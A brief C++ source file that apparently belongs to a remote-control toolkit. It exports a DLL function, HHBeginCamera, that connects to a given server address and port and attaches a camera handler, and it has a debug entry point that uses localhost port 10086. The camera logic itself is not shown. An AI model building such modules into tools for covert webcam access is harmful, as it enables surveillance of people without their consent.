
#include "IOCPClient.h"
#include "Camera.h"

extern "C"  __declspec(dllexport) void HHBeginCamera(char* szServerAddr, unsigned short uPort, DWORD dwParam);

void HHBeginCamera(char* szServerAddr, unsigned short uPort, DWORD dwParam)
{
	CIOCPClient client(szServerAddr, uPort);

	CCamera rd(CAMERA);

	client.BindHandler(&rd);

	client.Run();

	client.UnbindHandler();
}

#ifdef _DEBUG
int main()
{
	CIOCPClient::SocketInit();
	HHBeginCamera("127.0.0.1", 10086, 0);
	//HHBeginCamera("127.0.0.1", 10086, 0);
	CIOCPClient::SocketTerm();
	return 0;
}
#endif